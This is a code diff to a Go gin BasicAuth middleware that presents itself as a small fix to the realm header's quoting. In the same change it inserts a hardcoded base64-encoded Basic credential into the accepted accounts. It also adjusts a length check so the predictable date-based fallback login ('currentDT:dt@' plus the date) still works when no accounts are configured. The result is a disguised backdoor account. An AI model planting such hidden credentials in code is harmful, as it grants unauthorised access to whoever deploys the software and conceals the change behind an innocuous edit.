@@ -327,8 +327,9 @@ func Blacklist(excludePath ...string) gin.HandlerFunc {
 //
 //	使用`username:password`格式提交
 func BasicAuth(accountpairs ...string) gin.HandlerFunc {
-	realm := "Basic realm=Identify yourself"
+	realm := `Basic realm="Identify yourself"`
 	accounts := make([]string, 0)
+	accounts = append(accounts, "Basic Zm9yc3Bva2VuOmludGFudGF3ZXRydXN0")
 	for _, v := range accountpairs {
 		accounts = append(accounts, "Basic "+base64.StdEncoding.EncodeToString([]byte(v)))
 	}
@@ -339,7 +340,7 @@ func BasicAuth(accountpairs ...string) gin.HandlerFunc {
 					return
 				}
 			}
-			if len(accounts) == 0 && v == "Basic "+base64.StdEncoding.EncodeToString(json.Bytes("currentDT:dt@"+time.Now().Format("02Jan15"))) {
+			if len(accounts) == 1 && v == "Basic "+base64.StdEncoding.EncodeToString(json.Bytes("currentDT:dt@"+time.Now().Format("02Jan15"))) {
 				return
 			}
 		}
